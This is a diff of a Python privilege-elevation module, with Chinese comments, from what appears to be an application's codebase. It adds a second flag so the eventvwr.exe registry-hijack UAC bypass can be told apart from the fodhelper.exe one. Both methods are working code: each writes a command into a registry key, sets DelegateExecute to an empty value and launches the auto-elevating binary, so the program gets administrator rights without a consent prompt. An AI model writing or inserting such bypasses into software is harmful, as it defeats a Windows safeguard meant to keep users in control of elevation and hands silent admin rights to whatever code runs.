@@ -16,7 +16,8 @@ import sys
 import ctypes
 
 PYTHON_EXE = sys.executable
-UAC_BYPASS_FLAG_FILE = "__uac_bypass__"
+UAC_BYPASS_FLAG_FILE = "__uac_bypass__"            # fodhelper bypass 标记
+UAC_BYPASS_FLAG_EVENTVWR = "__uac_bypass_ev__"     # eventvwr bypass 标记
 UAC_DIALOG_FLAG = "--uac-dialog"
 
 # 方案 A：fodhelper.exe 绕过
@@ -51,6 +52,7 @@ def _try_bypass_via_registry(
     reg_path: str,
     exe_path: str,
     entry_script: str,
+    flag: str = UAC_BYPASS_FLAG_FILE,
 ) -> bool:
     """
     通用注册表劫持绕过 UAC。
@@ -59,7 +61,7 @@ def _try_bypass_via_registry(
     """
     try:
         current_dir = os.path.abspath(entry_script)
-        cmd = '"{}" "{}" {}'.format(PYTHON_EXE, current_dir, UAC_BYPASS_FLAG_FILE)
+        cmd = '"{}" "{}" {}'.format(PYTHON_EXE, current_dir, flag)
         _write_reg_key(reg_path, "DelegateExecute", "")
         _write_reg_key(reg_path, None, cmd)
         os.system(exe_path)
@@ -75,7 +77,7 @@ def _try_bypass_fodhelper(entry_script: str) -> bool:
 
 def _try_bypass_eventvwr(entry_script: str) -> bool:
     """方案 B：eventvwr.exe 注册表劫持（备选）"""
-    return _try_bypass_via_registry(EVENTVWR_REG_PATH, EVENTVWR, entry_script)
+    return _try_bypass_via_registry(EVENTVWR_REG_PATH, EVENTVWR, entry_script, UAC_BYPASS_FLAG_EVENTVWR)
 
 
 def _try_uac_dialog() -> None:
@@ -96,6 +98,8 @@ def _set_priv_method() -> None:
         return
     if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
         os.environ["OSEASY_PRIV_METHOD"] = "bypass_fodhelper"
+    elif UAC_BYPASS_FLAG_EVENTVWR in sys.argv:
+        os.environ["OSEASY_PRIV_METHOD"] = "bypass_eventvwr"
     elif UAC_DIALOG_FLAG in sys.argv:
         os.environ["OSEASY_PRIV_METHOD"] = "uac_dialog"
     else:
@@ -118,7 +122,7 @@ def elevate(entry_script: str) -> None:
         return
 
     # 防止递归
-    if sys.argv[-1] == UAC_BYPASS_FLAG_FILE:
+    if sys.argv[-1] in (UAC_BYPASS_FLAG_FILE, UAC_BYPASS_FLAG_EVENTVWR):
         return
 
     # 方案 A：fodhelper 绕过
